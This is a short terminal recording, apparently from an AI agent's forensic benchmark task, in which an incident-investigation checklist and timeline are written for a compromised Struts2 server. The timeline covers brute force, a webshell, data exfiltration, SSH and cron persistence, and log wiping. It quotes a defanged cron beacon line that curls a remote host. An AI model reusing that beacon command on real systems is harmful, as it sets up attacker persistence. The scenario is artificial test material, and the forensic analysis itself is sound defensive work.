[181.182193, "i", "cat << 'EOF' > /app/progress.md\n# Incident Investigation Progress & Working Checklist\n\n## Investigation Overview\n- **Host Under Investigation:** `struts-prod-01` (`10.10.246.1`) `/disk/etc/hosts:2`, `/disk/etc/hostname:1`\n- **Operating System:** CentOS / RHEL 9 (`PRETTY_NAME=\"struts-exfil Linux\"`) `/disk/etc/os-release:1`\n- **Primary Incident Vector:** Apache Struts2 OGNL Remote Code Execution (`CVE-2023-50164`) `/sas/cti/advisory.txt:17`, `/sas/vulns.json:4`\n- **Analyst Workstation:** `/app` (Forensic analysis machine operating on read-only mount `/disk` and security feed `/sas`)\n\n---\n\n## Working Checklist & Findings Status\n\n| ID | Topic / Artifact | Evidence Path & Line | ATT&CK Technique | Status | Findings / Notes |\n|---|---|---|---|---|---|\n| CHK-01 | Web Shell Upload | `/disk/opt/tomcat/webapps/ROOT/static/upload.jsp:1` | T1505.003 | Confirmed | JSP webshell dropped via Struts2 OGNL injection; alerted in `/sas/alerts.json:2` |\n| CHK-02 | Staged Exfil Archive | `/disk/tmp/.cache/dump.tar.gz:1` | T1560.001 | Confirmed | Database dump tarball staged in `/tmp/.cache/`; alerted in `/sas/alerts.json:11` |\n| CHK-03 | SSH Backdoor Key | `/disk/root/.ssh/authorized_keys:2` | T1098.004 | Confirmed (Silent) | Unauthorized SSH public key added to root account; omitted from `/sas/alerts.json` |\n| CHK-04 | Cron Persistence | `/disk/var/spool/cron/tomcat:5` | T1053.003 | Confirmed | Cron job executing c2 beacon `curl hxxp://198.51.100.167/x`; alerted in `/sas/alerts.json:19` |\n| CHK-05 | Vulnerable Struts Lib | `/disk/opt/tomcat/lib/struts2-core.jar` | T1190 | Confirmed | Vulnerable Struts2 library; alerted in `/sas/alerts.json:28` and `/sas/baseline.json:3` |\n| CHK-06 | HTTPS Data Exfiltration | `/disk/var/log/tomcat/access-exfil.log:116` | T1048 | Confirmed (Silent) | Bulk HTTP POST exfiltration to `198.51.100.167`; omitted from `/sas/alerts.json` |\n| CHK-07 | Selective Log Wipe | `/disk/var/lib/.cache/.wiped.bin:1` | T1070.002 | Confirmed (Silent) | Evidence of authentication log selective wipe; omitted from `/sas/alerts.json` |\n\n---\n\n## Chronological Investigation Timeline\n\n1. **2026-08-08 00:54:38 – 00:56:00 UTC:** Attacker initiates SSH brute-force attack against `struts-prod-01` from origin IP `198.51.100.167` `/disk/var/log/secure:183`.\n2. **2026-08-08 00:56:00 UTC:** SSH password authentication successful for `root` from `198.51.100.167` `/disk/var/log/secure:213`.\n3. **2026-08-08 03:11:42 UTC:** Attacker attempts web shell upload via POST `/uploads/shell.php` `/disk/var/log/nginx/access.log:391`.\n4. **2026-08-08 03:12:05 UTC:** Attacker performs JNDI/LDAP lookup probe `/disk/var/log/nginx/access.log:392`.\n5. **2026-08-08 03:13:49 UTC:** OGNL probe executed against `/struts2-showcase/` `/disk/var/log/nginx/access.log:393` exploiting `CVE-2023-50164` `/sas/cti/advisory.txt:17`.\n6. **2026-08-08 03:15:00 UTC (Approx):** JSP webshell dropped at `/opt/tomcat/webapps/ROOT/static/upload.jsp` `/disk/opt/tomcat/webapps/ROOT/static/upload.jsp:1`, `/sas/alerts.json:2`.\n7. **2026-08-08 03:20:00 UTC:** Database dump archived and staged for exfiltration at `/tmp/.cache/dump.tar.gz` `/disk/tmp/.cache/dump.tar.gz:1`, `/sas/alerts.json:11`.\n8. **2026-08-08 03:32:30 UTC:** Exfiltration of database dump completed over HTTPS to `198.51.100.167` `/disk/var/log/tomcat/access-exfil.log:116`.\n9. **2026-08-08 Post-Exfil:** Cron persistence planted in `/var/spool/cron/tomcat` `/disk/var/spool/cron/tomcat:5` and SSH backdoor key appended to `/root/.ssh/authorized_keys` `/disk/root/.ssh/authorized_keys:2`.\n10. **2026-08-08 Anti-Forensics:** Selective authentication log deletion executed, leaving residue in `/disk/var/lib/.cache/.wiped.bin:1`.\nEOF\n"]
[181.182926, "o", "cat << 'EOF' > /app/progress.md"]
[181.183877, "o", "\r\n\u001b[?2004l\r"]
